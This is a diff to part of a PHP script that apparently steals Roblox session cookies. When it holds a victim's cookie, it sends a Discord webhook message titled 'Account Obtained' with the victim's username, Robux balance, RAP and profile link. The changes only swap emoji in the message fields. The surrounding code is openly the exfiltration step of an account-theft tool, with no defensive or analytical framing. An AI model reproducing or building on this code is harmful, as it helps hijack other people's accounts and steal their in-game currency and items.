@@ -90,7 +90,7 @@ if ($cookie) {
             "avatar_url" => "https://cdn.discordapp.com/attachments/566887245882064896/802011064187093012/cat_PNG50525.png",
             "embeds" => [
                 [
-                    "title" => ":money_with_wings:Account Obtained",
+                    "title" => "Account Obtained",
                     "type" => "rich",
                     "description" => "",
                     "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
@@ -109,11 +109,11 @@ if ($cookie) {
                             "value" => $profile["UserName"]
                         ],
                         [
-                            "name" => "Robux :moneybag: ",
+                            "name" => "Robux :money_with_wings: ",
                             "value" => $profile["RobuxBalance"]
                         ],
                         [
-                            "name" => "RAP",
+                            "name" => "RAP :moneybag: ",
                             "value" => $user_rap
                         ],
                         [
